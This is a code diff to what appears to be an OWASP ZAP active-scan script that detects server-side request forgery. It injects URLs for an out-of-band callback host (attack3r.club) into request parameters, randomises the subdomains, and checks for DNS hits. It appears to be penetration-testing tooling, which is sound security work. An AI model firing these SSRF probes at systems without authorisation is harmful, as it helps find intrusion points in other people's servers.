@@ -6,10 +6,13 @@ Note that new active scripts will initially be disabled
 Right click the script in the Scripts tree and select "enable"  
 """
 import org.apache.http.HttpResponse
-#import org.apache.http.client.HttpClient
-#import org.apache.http.impl.client.DefaultHttpClient
-#import org.apache.http.util.EntityUtils
+import org.apache.http.client.HttpClient
+import org.apache.http.impl.client.DefaultHttpClient
+import org.apache.http.client.methods.HttpGet
+import org.apache.http.util.EntityUtils
 import time
+import random
+
 
 def checkDnsHit(prefix_payload):
 	client =  org.apache.http.impl.client.DefaultHttpClient()
@@ -26,6 +29,7 @@ def checkDnsHit(prefix_payload):
 
 payloads = ['http://ssrfpoc.obb.attack3r.club', 'https://ssrfpoc.obb.attack3r.club', 'ssrfpoc.obb.attack3r.club']
 positive_responses = ['Exception', 'exception']
+
 def scanNode(sas, msg):
   # Debugging can be done using print like this
   print('scan called for url=' + msg.getRequestHeader().getURI().toString());
@@ -43,8 +47,8 @@ def scan(sas, msg, param, value):
   # Debugging can be done using print like this
   print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
     ' param=' + param + ' value=' + value);
-  for payload in payloads:
-	
+  for p in payloads:
+	payload = p.replace("ssrfpoc", "ssrfpoc" + str(random.randint(1000, 99999)))
   	# Copy requests before reusing them
   	msg_clone = msg.cloneRequest();
 	
@@ -56,9 +60,8 @@ def scan(sas, msg, param, value):
   		sas.sendAndReceive(msg_clone, False, False);
 		res_body_str = msg_clone.getResponseBody().toString()
   		# Test the response here, and make other requests as required
-		time.sleep(2)
-  		if checkDnsHit("ssrfpoc"):
-		
+		time.sleep(1)
+  		if checkDnsHit(payload.upper()):
   		# Change to a test which detects the vulnerability
 	    	# raiseAlert(risk, int reliability, String name, String description, String uri, 
 	   	#		String param, String attack, String otherInfo, String solution, String evidence, 
